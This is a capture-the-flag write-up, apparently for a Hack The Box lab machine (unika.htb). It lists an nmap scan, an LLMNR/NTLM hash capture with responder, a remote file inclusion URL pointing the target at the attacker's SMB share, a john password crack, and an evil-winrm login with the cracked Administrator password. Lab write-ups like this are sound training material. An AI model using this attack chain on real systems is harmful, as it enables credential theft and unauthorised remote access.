# reconnaissance
## nmap scan
- [nmap scan](./nmap.txt)
- nmap -sV unika.htb -oN nmap.txt
- Apache web server on port 80/tcp
- WinRM server on port 5985/tcp

# resource development
## responder tool
- [NTLM hash](./stlm_hash.png)
- responder -I tun0
- listening on the interface connected to the LAN of the target for LLMNR (Link Local Multicast Neighbor Resolution)
- so that we can get the username and HASH (MD4) used to authenticate via NTLM

# initial access
## remote-file-intrusion
- [RFI command](./remote_file_intrusion.png)
- http://unika.htb/index.php?page=//10.10.14.78/test
- the responder logs are stored in: /usr/share/responder/log
- the hash inside the log is saved inside [NTLM hash] (./hash.txt)

## hash crack
- [NTLM hash cracked](./hash_cracking.png)
- john --wordlist=/usr/share/wordlist/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./hash.txt

## WinRM access
- [WinRM shell access](WinRM_access.png)
- evil-winrm -i unika.htb -u Administrator -p badminton

# privilege escalation
- [root flag](root_flag.png)
- cat C:\Users\mike\Desktop\flag.txt
